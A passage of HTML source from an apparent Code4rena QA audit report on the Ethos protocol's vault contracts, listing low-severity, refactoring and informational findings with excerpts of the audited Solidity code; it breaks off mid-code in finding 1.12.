href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/698\">zzzitron</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/696\">imare</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/688\">ch0bu</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/677\">peanuts</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/658\">ast3ros</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/617\">lukris02</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/602\">shark</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/599\">CodeFoxInc</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/591\">SuperRayss</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/582\">hacker-dom</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/580\">Bjorn_bug</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/575\">PaludoX0</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/556\">Phantasmagoria</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/527\">martin</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/513\">0xackermann</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/496\">ABA</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/491\">Breeje</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/472\">matrix_0wl</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/471\">0xnev</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/470\">0xTheC0der</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/467\">luxartvinsec</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/457\">Rickard</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/445\">fs0c</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/439\">IceBear</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/436\">cryptonue</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/432\">DadeKuma</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/427\">vagrant</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/409\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/387\">emmac002</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/380\">chrisdior4</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/365\">0xAgro</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/358\">descharre</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/351\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/336\">Viktor_Cortess</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/329\">codeislight</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/326\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/317\">tnevler</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/310\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/292\">trustindistrust</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/251\">btk</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/240\">0x3b</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/142\">Co0nan</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/87\">BRONZEDISC</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/27\">Sathish9098</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/25\">arialblack14</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/23\">UdarTeam</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/21\">dontonka</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/10\">DeFiHackLabs</a>, and <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/8\">chaduke</a>.</em></p>\n<h2 id=\"executive-summary\" style=\"position:relative;\"><a href=\"#executive-summary\" aria-label=\"executive summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Executive Summary</h2>\n<p>The following QA Report is an aggregate of smaller reports divided by contract / topic.</p>\n<p>The following criteria are used for suggested severity:</p>\n<ul>\n<li>L - Low Severity -> Some risk</li>\n<li>R - Refactoring -> Suggested changes for improvements</li>\n<li>NC - Non-Critical / Informational -> Minor suggestions</li>\n</ul>\n<h2 id=\"1-vault\" style=\"position:relative;\"><a href=\"#1-vault\" aria-label=\"1 vault permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1. Vault</h2>\n<h3 id=\"11-l---strategy-doesnt-have-incasetokensgetstuck\" style=\"position:relative;\"><a href=\"#11-l---strategy-doesnt-have-incasetokensgetstuck\" aria-label=\"11 l   strategy doesnt have incasetokensgetstuck permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.1. L - Strategy doesn’t have <code>inCaseTokensGetStuck</code></h3>\n<p>Most Yield Farming Strategies interact with other protocols and for this reason they are subject to airdrops.</p>\n<p>Without a <code>inCaseTokensGetStuck</code> these extra tokens would not be claimable and would be lost forever</p>\n<h3 id=\"12-l---deposit--withdraw-use-fot-compatible-math-but-withdrawing-from-strategy-doesnt\" style=\"position:relative;\"><a href=\"#12-l---deposit--withdraw-use-fot-compatible-math-but-withdrawing-from-strategy-doesnt\" aria-label=\"12 l   deposit  withdraw use fot compatible math but withdrawing from strategy doesnt permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.2. L - Deposit / Withdraw use FOT compatible math, but withdrawing from strategy doesn’t</h3>\n<p>While some parts of the code seem to be written to support FeeOnTransfer Tokens, other parts do not, which may cause accounting issues</p>\n<h3 id=\"13-r---roles-for-vault-and-strat-are-set-separately\" style=\"position:relative;\"><a href=\"#13-r---roles-for-vault-and-strat-are-set-separately\" aria-label=\"13 r   roles for vault and strat are set separately permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.3. R - Roles for Vault and Strat are set separately</h3>\n<p>While a vault can have multiple strategies</p>\n<p>A strategy can only ever be used with one vault</p>\n<p>For this reason it may be best to have a single set of Role Management Logic, in the Vault and have the strategy ask the vault rather than duplicating storage values, which may desynch</p>\n<h3 id=\"14-l---maxloss-hardcoded-means-the-contract-will-revert-if-any-loss-bigger-than-bps-happens\" style=\"position:relative;\"><a href=\"#14-l---maxloss-hardcoded-means-the-contract-will-revert-if-any-loss-bigger-than-bps-happens\" aria-label=\"14 l   maxloss hardcoded means the contract will revert if any loss bigger than bps happens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.4. L - MaxLoss hardcoded means the contract will revert if any loss bigger than BPS happens</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L55-L56\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L55-L56</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">withdrawMaxLoss</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Due to the logic handling of losses, and because of the value being hardcoded, the Strategy may be unable to withdraw until the value is changed.</p>\n<h3 id=\"15-r---can-refactor-to-simplify\" style=\"position:relative;\"><a href=\"#15-r---can-refactor-to-simplify\" aria-label=\"15 r   can refactor to simplify permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.5. R - Can refactor to simplify</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/mixins/ReaperAccessControl.sol#L21-L45\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/mixins/ReaperAccessControl.sol#L21-L45</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_atLeastRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_role</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cascadingAccessRoles</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_cascadingAccessRoles</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numRoles</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">cascadingAccessRoles</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">specifiedRoleFound</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">senderHighestRoleFound</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// {_role} must be found in the {cascadingAccessRoles} array.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Also, msg.sender&#39;s highest role index &lt;= specified role index.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numRoles</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uncheckedInc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// If the highest was not found and they have a role that is same or higher</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">senderHighestRoleFound</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk11\">_hasRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">cascadingAccessRoles</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">senderHighestRoleFound</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// If we are at the this role part of the loop</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// E.g. we may or may have not found it here</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_role</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">cascadingAccessRoles</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">specifiedRoleFound</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">break</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// require(senderHighestRoleFound)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">specifiedRoleFound</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">senderHighestRoleFound</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Unauthorized access&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"16-r---track-stats-via-ninja\" style=\"position:relative;\"><a href=\"#16-r---track-stats-via-ninja\" aria-label=\"16 r   track stats via ninja permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.6. R - Track stats via Ninja</h3>\n<p>By adding a return value via a struct of the form:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TokenAmount</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>You can track the return value from harvest on a block by block basis, allowing for better monitoring</p>\n<p>An example of the dashboard we built:<br>\n<a href=\"https://badger-ninja.vercel.app/vault/ethereum/0xBA485b556399123261a5F9c95d413B4f93107407\">https://badger-ninja.vercel.app/vault/ethereum/0xBA485b556399123261a5F9c95d413B4f93107407</a></p>\n<h3 id=\"17-r---track-harvest-health-via-health-check-by-yearn\" style=\"position:relative;\"><a href=\"#17-r---track-harvest-health-via-health-check-by-yearn\" aria-label=\"17 r   track harvest health via health check by yearn permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.7. R - Track harvest health via Health Check (by Yearn)</h3>\n<p>Newer versions of Yearn Strategies use an <a href=\"https://github.com/yearn/yearn-vaults/blob/master/contracts/CommonHealthCheck.sol\">Health Check</a>, this can help prevent an harvest when it could cause a loss.</p>\n<p>It may be best to add this to enforce safe operations on-chain.</p>\n<h3 id=\"18-r---consider-forking-yearnwatch\" style=\"position:relative;\"><a href=\"#18-r---consider-forking-yearnwatch\" aria-label=\"18 r   consider forking yearnwatch permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.8. R - Consider forking Yearn.Watch</h3>\n<p>Because the Vault is heavily inspired by YearnV2, you should be able to fork yearn.watch and have it provide automatic reporting</p>\n<p>Site: <a href=\"https://yearn.watch/\">https://yearn.watch/</a></p>\n<h3 id=\"19-nc---percent_divisor-is-more-a-bps_divisor\" style=\"position:relative;\"><a href=\"#19-nc---percent_divisor-is-more-a-bps_divisor\" aria-label=\"19 nc   percent_divisor is more a bps_divisor permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.9. NC - <code>PERCENT_DIVISOR</code> is more a <code>BPS_DIVISOR</code></h3>\n<p>The naming could be changed to reflect the unit used</p>\n<h3 id=\"110-r---math-for-issuing-shares-can-be-turned-into-an-internal-function\" style=\"position:relative;\"><a href=\"#110-r---math-for-issuing-shares-can-be-turned-into-an-internal-function\" aria-label=\"110 r   math for issuing shares can be turned into an internal function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.10. R - Math for issuing shares can be turned into an internal function</h3>\n<p>The logic is reused multiple times, the code can be simplified by using an internal pure function</p>\n<h3 id=\"111-r---license-may-be-incompatible-with-source-code\" style=\"position:relative;\"><a href=\"#111-r---license-may-be-incompatible-with-source-code\" aria-label=\"111 r   license may be incompatible with source code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.11. R - License may be incompatible with source code</h3>\n<p><code>// SPDX-License-Identifier: BUSL-1.1</code></p>\n<p>Because the code is heavily inspired by YearnV2 and derivatives, a stricter license may not be valid</p>\n<h3 id=\"112-r---performance-fee-is-paid-out-to-treasury-twice\" style=\"position:relative;\"><a href=\"#112-r---performance-fee-is-paid-out-to-treasury-twice\" aria-label=\"112 r   performance fee is paid out to treasury twice permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.12. R - Performance Fee is Paid Out to Treasury Twice</h3>\n<p>-> On Harvest<br>\n<a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L463-L471\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L463-L471</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span 